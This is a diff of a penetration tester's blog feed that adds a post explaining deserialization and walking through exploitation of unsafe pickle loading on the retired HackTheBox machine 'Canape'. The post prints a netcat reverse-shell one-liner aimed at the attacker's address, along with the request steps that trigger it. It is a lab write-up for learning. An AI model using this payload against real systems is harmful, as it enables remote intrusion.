@@ -1,4 +1,101 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-06-16T14:30:26-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">alex fox</title><subtitle>penetration tester</subtitle><entry><title type="html">Server Side Template Injection</title><link href="http://localhost:4000/SSTI/" rel="alternate" type="text/html" title="Server Side Template Injection" /><published>2020-04-20T00:00:00-04:00</published><updated>2020-04-20T00:00:00-04:00</updated><id>http://localhost:4000/SSTI</id><content type="html" xml:base="http://localhost:4000/SSTI/">&lt;p&gt;Template engines are becoming a popular choice in today’s webapp ecosystem and with them come a type of vulnerability known as SSTI, or Server Side Template Injection. A template engine uses static template files which at runtime replace variables or placeholders with actual values in the HTML page. This results in a webpage that appears more dynamic. SSTI vulnerabilities occur when user-controlled input is embedded within a template in an unsafe manner. SSTI can look similar to XSS vulnerabilities however, SSTIs are executed server side which is inherently more dangerous (as the user can gain control of the server).&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-06-18T14:15:06-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">alex fox</title><subtitle>penetration tester</subtitle><entry><title type="html">Deserialization</title><link href="http://localhost:4000/Deserialization/" rel="alternate" type="text/html" title="Deserialization" /><published>2020-06-16T00:00:00-04:00</published><updated>2020-06-16T00:00:00-04:00</updated><id>http://localhost:4000/Deserialization</id><content type="html" xml:base="http://localhost:4000/Deserialization/">&lt;p&gt;What is Deserialization?&lt;/p&gt;
+
+&lt;p&gt;Modern applications are often decentralized and as such, utilize multiple components (such as microservices) which often talk to one another and share and store data. Serialization is used to convert an object into something that can be shared across a network or stored in a file.&lt;/p&gt;
+
+&lt;p&gt;For example, JSON is a popular choice for serializing complex data objects into simple strings so that they might be transported or stored. The restoration of serialized data back into their complex object form is known as deserialization.&lt;/p&gt;
+
+&lt;p&gt;We first need to require ruby’s &lt;b&gt;“json”&lt;/b&gt; module.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-rb&quot; data-lang=&quot;rb&quot;&gt;&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;002&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'json'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;003&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;glanton_gang&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;newbie: &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;the kid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;outlaw: &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;toadvine&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;priest: &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tobin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;captain: &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;glanton&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;devil: &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;the judge&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:newbie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;the kid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:outlaw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;toadvine&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:priest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tobin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:captain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;glanton&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:devil&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;the judge&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;004&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;glanton_gang&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;class&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Hash&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;005&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;glanton_gang_json&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;glanton_gang&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_json&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;{&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;newbie&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;the kid&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;outlaw&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;toadvine&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;priest&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;tobin&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;captain&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;glanton&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;devil&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;the judge&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;}&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;006&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;glanton_gang_json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;class&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;String&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;irb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;007&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This is a straightforward example of serialization, in which our data object of a hash is being converted into strings by way of the &lt;b&gt;to_json&lt;/b&gt; method. This makes our data language agnostic and ready to be stored in a file.&lt;/p&gt;
+
+&lt;p&gt;Serialization is common in architectures that include APIs, microservices, and client-side MVC. When the data being serialized is trusted (such as, by the system), there is no issue. However, when a user can control or modify input, deserialization vulnerabilities can arise. The conversion back from string (or whatever form the serialized data is stored as) to binary can be tampered with and result in remote code execution. It’s important to note that not all forms of serialization involve serializing to strings, for example, one method of serializing data in python uses the &lt;b&gt;pickle&lt;/b&gt; module.&lt;/p&gt;
+
+&lt;p&gt;Let’s take a look at the Python docs. Python’s &lt;a href=&quot;https://docs.python.org/3/library/pickle.html&quot;&gt;pickle module&lt;/a&gt; implements binary protocol for serializing and deserializing a python object. “Pickling” is the process whereby a Python object hierarchy is converted into a byte stream, and “unpickling” is the inverse operation, whereby a byte stream (from a binary file or bytes-like object) is converted back into an object hierarchy. In other words, pickling == serializing and depickling == deserializing.&lt;/p&gt;
+
+&lt;h3&gt;Unsafe Deserialization: HTB's &lt;i&gt;Canape&lt;/i&gt;&lt;/h3&gt;
+
+&lt;p&gt;We are going to be examining a small portion of the retired hackthebox (HTB) box &lt;b&gt;“Canape”&lt;/b&gt;, which contains a vulnerable pickle function that deserializes unsanitized user data. The box in question is hosting a flask application on port 80, and after running a gobuster scan with a lengthy wordlist we discover the git configuration file. We add this git subdomain to our /etc/hosts file and then we can view the flask app’s git repository. This will inform us on what’s going on behind the scenes and how to craft our exploit.&lt;/p&gt;
+
+&lt;p&gt;The vulnerable page in question:
+&lt;img src=&quot;/images/canape/quotes.png&quot; alt=&quot;Quotes form submission&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The vulnerable code in question:
+&lt;img src=&quot;/images/canape/pickle-code-vuln.png&quot; alt=&quot;Flask app code&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This is not the full &lt;b&gt;__init__.py&lt;/b&gt; file but it contains what we’re interested in. On the webpage we can see that we can submit a Simpsons’ character and a quote. Looking at the code, specifically the “submit” route, we can see that on a form submission the application looks for a character and quote. It then checks if the character is whitelisted. If the submitted character is whitelisted, then the code goes on to process the quote (regardless if the quote is valid; it only checks if the quote is empty or not), and stores the data in a pickle file with an md5 filename.&lt;/p&gt;
+
+&lt;p&gt;The dangerous portion of this application is the above combined with the check route, which proceeds to open the file containing the user-submitted character and quote depending on an ‘id’ POST parameter. It then deserializes the user-submitted data by way of &lt;b&gt;cPickle.loads(data)&lt;/b&gt;. Thankfully, we know exactly how to name our file: &lt;b&gt;p_id = md5(char + quote).hexidigest()&lt;/b&gt;.&lt;/p&gt;
+
+&lt;p&gt;So, to recap, we will be taking the following steps to exploit this unsafe deserialization:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Submit a valid character name&lt;/li&gt;
+  &lt;li&gt;Submit a quote that is actually an os.system command that connects to our local listener&lt;/li&gt;
+  &lt;li&gt;The application will load our data using &lt;b&gt;cPickle.loads(data)&lt;/b&gt;&lt;/li&gt;
+  &lt;li&gt;Our exploit is triggered and our listener receives a shell&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;We look at the vulnerable code as we craft our exploit. We need to import the following libraries:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Os: to run system commands&lt;/li&gt;
+  &lt;li&gt;Requests: to made requests to the vulnerable flask application&lt;/li&gt;
+  &lt;li&gt;Md5: to name our file properly (following the flask app’s file-naming convention)&lt;/li&gt;
+  &lt;li&gt;cPickle: &lt;b&gt;cPickle&lt;/b&gt; is an optimized version of the pickle module written in C, and it is what our vulnerable application is using, so we will use it in the exploit&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Note that there is nothing inherently dangerous about the &lt;b&gt;pickle&lt;/b&gt; module, it’s only dangerous when you allow an untrusted source to be pickled/unpickled–as this web application is doing.&lt;/p&gt;
+
+&lt;p&gt;Our exploit code:
+&lt;img src=&quot;/images/canape/exploit.png&quot; alt=&quot;Exploit code&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A quick examination of our exploit code:&lt;/p&gt;
+
+&lt;h6&gt;def __reduce__(self);&lt;/h6&gt;
+
+&lt;p&gt;&lt;b&gt;pickle&lt;/b&gt; allows arbitrary objects to declare how they should be pickled by defining a &lt;strong&gt;reduce&lt;/strong&gt; method, which should return either a string or a tuple describing how to reconstruct this object on unpacking.&lt;sup id=&quot;fnref:1&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+
+&lt;p&gt;We are constructing a pickle that, upon unpickling, will execute:
+&lt;b&gt;homer!;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.29 5555 &amp;gt;/tmp/f&lt;/b&gt;&lt;/p&gt;
+
+&lt;p&gt;For whatever reason I’m partial to the above one-liner, though it’s likely poor practice to assume netcat is on machines. From my previous experience of working on this box, I know the above will execute. However, if this wasn’t the case, there are plenty of other options for getting a shell, including calling upon python’s &lt;b&gt;subprocess&lt;/b&gt; module.&lt;/p&gt;
+
+&lt;h6&gt;cPickle.dumps&lt;/h6&gt;
+&lt;p&gt;Returns the pickled object as a bytes object (meaning, it is serialized).&lt;/p&gt;
+
+&lt;h6&gt;char, quote = sc.split(“!”)&lt;/h6&gt;
+&lt;p&gt;We are splitting the character and quote on the exclamation point, meaning, everything before the exclamation point is equal to the character (homer), everything after is the quote. We need to do this to adhere to the check performed on the character parameter.&lt;/p&gt;
+
+&lt;h6&gt;p_id = md5(char + quote).hexdigest()&lt;/h6&gt;
+&lt;p&gt;We are naming our file following the conventions set out in the flask application.&lt;/p&gt;
+
+&lt;h6&gt;requests.post('http://10.10.10.70/submit', data={'character': char, 'quote': quote})&lt;/h6&gt;
+&lt;p&gt;We are submitting a post request to the submit page, with our character and quote&lt;/p&gt;
+
+&lt;h6&gt;requests.post('http://10.10.10.70/check', data={'id': p_id})&lt;/h6&gt;
+&lt;p&gt;We are submitting a post request to the vulnerable check page, with the id of our pickled file. This triggers the vulnerable &lt;b&gt;cPickle.loads(data)&lt;/b&gt;, which deserializes our data and executes the connection back to our reverse shell.&lt;/p&gt;
+
+&lt;p&gt;Now we will run our exploit, and voila, we have a shell!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/canape/shell.png&quot; alt=&quot;Shell&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;footnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:1&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://blog.nelhage.com/2011/03/exploiting-pickle/&quot;&gt;https://blog.nelhage.com/2011/03/exploiting-pickle&lt;/a&gt; &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;</content><author><name></name></author><summary type="html">What is Deserialization?</summary></entry><entry><title type="html">Server Side Template Injection</title><link href="http://localhost:4000/SSTI/" rel="alternate" type="text/html" title="Server Side Template Injection" /><published>2020-04-20T00:00:00-04:00</published><updated>2020-04-20T00:00:00-04:00</updated><id>http://localhost:4000/SSTI</id><content type="html" xml:base="http://localhost:4000/SSTI/">&lt;p&gt;Template engines are becoming a popular choice in today’s webapp ecosystem and with them come a type of vulnerability known as SSTI, or Server Side Template Injection. A template engine uses static template files which at runtime replace variables or placeholders with actual values in the HTML page. This results in a webpage that appears more dynamic. SSTI vulnerabilities occur when user-controlled input is embedded within a template in an unsafe manner. SSTI can look similar to XSS vulnerabilities however, SSTIs are executed server side which is inherently more dangerous (as the user can gain control of the server).&lt;/p&gt;
 
 &lt;p&gt;Examples of such template engines are: Twig, Freemarker, Flask, Jinja2.&lt;/p&gt;
 
